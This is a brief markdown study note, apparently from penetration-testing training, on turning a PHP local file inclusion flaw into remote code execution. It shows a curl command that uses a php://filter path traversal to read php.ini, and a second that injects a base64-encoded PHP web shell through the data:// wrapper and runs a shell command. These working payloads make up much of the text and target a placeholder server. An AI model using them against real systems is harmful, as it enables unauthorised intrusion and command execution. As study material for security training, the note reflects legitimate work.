# Data wrapper

1.The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations

2.To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version

3. allow_url_include is not enabled by default
```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

<img width="1278" height="302" alt="image" src="https://github.com/user-attachments/assets/24cc1fc7-2d7d-4b68-9362-c18305a8dab9" />

<img width="1261" height="107" alt="image" src="https://github.com/user-attachments/assets/3ac11aa3-4e9d-499e-a492-775fa44487db" />

4. After that use data wrapper to do RCE

<img width="1264" height="124" alt="image" src="https://github.com/user-attachments/assets/ef4e8a39-1fc0-4cac-af8f-7d25c10f18ab" />


```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%09-al'

```


